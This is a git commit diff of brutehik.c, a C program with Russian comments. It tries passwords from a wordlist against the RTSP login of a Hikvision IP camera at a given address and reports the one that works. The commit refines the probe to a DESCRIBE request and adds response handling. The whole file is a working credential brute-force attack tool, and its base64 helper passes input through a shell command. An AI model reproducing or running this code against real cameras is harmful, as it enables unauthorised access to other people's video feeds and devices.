8928b7aeb29127d7bb08245d97bf8bb479da3efe
Dr <146625050+AnonimusShamshiAlex@users.noreply.github.com>
2025-04-22 20:26:32 +0500

    Update brutehik.c

--- brutehik.c
+++ brutehik.c
@@ -5,9 +5,9 @@
 #include <arpa/inet.h>
 
 #define BUFFER_SIZE 2048
-#define PASSWORD_LENGTH 100 // Определяем длину пароля
+#define PASSWORD_LENGTH 100
 
-// Функция для кодирования в Base64 через системный вызов (Termux-friendly)
+// Base64 через системный вызов (подходит для Termux)
 char *base64_encode(const char *input) {
     char command[BUFFER_SIZE];
     char *result = malloc(BUFFER_SIZE);
@@ -22,13 +22,13 @@ char *base64_encode(const char *input) {
     }
 
     fgets(result, BUFFER_SIZE, fp);
-    result[strcspn(result, "\n")] = '\0'; // Удаляем \n
+    result[strcspn(result, "\n")] = '\0';
 
     pclose(fp);
     return result;
 }
 
-// Функция для брутфорса одного пароля
+// Отправка DESCRIBE запроса и проверка ответа
 int rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
     int sock;
     struct sockaddr_in server_addr;
@@ -40,7 +40,6 @@ int rtsp_bruteforce(const char *target_ip, int target_port, const char *username
     char *auth_encoded = base64_encode(userpass);
     if (!auth_encoded) return 0;
 
-    // Создаём сокет
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         perror("Ошибка создания сокета");
@@ -60,22 +59,31 @@ int rtsp_bruteforce(const char *target_ip, int target_port, const char *username
     }
 
     snprintf(request, sizeof(request),
-             "OPTIONS rtsp://%s/ RTSP/1.0\r\n"
-             "CSeq: 1\r\n"
+             "DESCRIBE rtsp://%s/ RTSP/1.0\r\n"
+             "CSeq: 2\r\n"
+             "Accept: application/sdp\r\n"
              "Authorization: Basic %s\r\n\r\n",
              target_ip, auth_encoded);
 
     send(sock, request, strlen(request), 0);
-    recv(sock, response, sizeof(response) - 1, 0);
-    response[sizeof(response) - 1] = '\0';
+    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
+    if (bytes_received < 0) {
+        perror("Ошибка при получении ответа");
+        close(sock);
+        free(auth_encoded);
+        return 0;
+    }
+    response[bytes_received] = '\0';
 
     if (strstr(response, "200 OK")) {
-        printf("\033[0;32m[✔] Успешный пароль: %s\033[0m\n", password);
+        printf("\033[0;32m[✔] Найден пароль: %s\033[0m\n", password);
         close(sock);
         free(auth_encoded);
         return 1;
+    } else if (strstr(response, "401 Unauthorized")) {
+        printf("\033[0;31m[✘] Отказ в доступе: %s\033[0m\n", password);
     } else {
-        printf("\033[0;31m[✘] Неверный пароль: %s\033[0m\n", password);
+        printf("\033[0;33m[?] Неожданный ответ: %s\033[0m\n", password);
     }
 
     close(sock);
@@ -85,13 +93,13 @@ int rtsp_bruteforce(const char *target_ip, int target_port, const char *username
 
 int main() {
     char target_ip[64];
-    int target_port = 554; // Порт по умолчанию для RTSP
+    int target_port = 554;
     char username[100];
     char password[PASSWORD_LENGTH];
 
     printf("Введите IP RTSP сервера Hikvision: ");
     scanf("%63s", target_ip);
-    getchar(); // Съедаем лишний Enter
+    getchar();
 
     printf("Введите логин (обычно 'admin'): ");
     fgets(username, sizeof(username), stdin);
@@ -103,17 +111,17 @@ int main() {
         return 1;
     }
 
-    printf("\nНачинаем брутфорс для Hikvision...\n\n");
+    printf("\nЗапуск брутфорса...\n\n");
 
     while (fgets(password, PASSWORD_LENGTH, file)) {
         password[strcspn(password, "\n")] = 0;
 
         if (rtsp_bruteforce(target_ip, target_port, username, password)) {
-            printf("\n\033[1;34m[*] Пароль найден для Hikvision: %s\033[0m\n", password);
+            printf("\n\033[1;34m[*] Успешная аутентификация: %s\033[0m\n", password);
             break;
         }
 
-        sleep(1); // Немного подождать, чтобы не заспамить сервер
+        sleep(1);
     }
 
     fclose(file);
